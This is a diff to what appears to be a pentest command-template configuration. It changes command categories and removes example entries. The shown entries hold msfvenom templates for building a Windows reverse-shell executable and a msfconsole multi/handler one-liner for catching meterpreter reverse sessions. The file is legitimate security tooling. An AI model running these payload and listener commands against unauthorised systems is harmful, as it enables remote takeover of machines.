@@ -12,22 +12,16 @@ examples = [
 [command.Msfvenom]
 use_name = "msfvenom"
 local = true
-cmd_types = "pentest|craft|code"
+cmd_types = "shell"
 short_desc = "Create reverse shell tcp"
 args = "msfvenom -p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|4444> -f <type|exe> > reverse_tcp.exe"
-examples = [
-    "msfvenom -p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
-]
 
 [command.Msfconsole]
 use_name = "msfconsole"
 local = true
-cmd_types = "pentest"
+cmd_types = "shell"
 short_desc = "Handler reverse shell tcp in loop"
 args = "msfconsole -q -x 'use exploit/multi/handler;set ExitOnSession false;set payload <PAYLOAD|windows/meterpreter/reverse_tcp> ;set LHOST <LHOST|127.0.0.1> ;set LPORT <LPORT|4444> ;run -j;'"
-examples = [
-    "msfconsole -q -x 'use exploit/multi/handler;set ExitOnSession false;set payload windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 4444;run -j;'"
-]
 
 [command.ConnectBack]
 use_name = "shell"
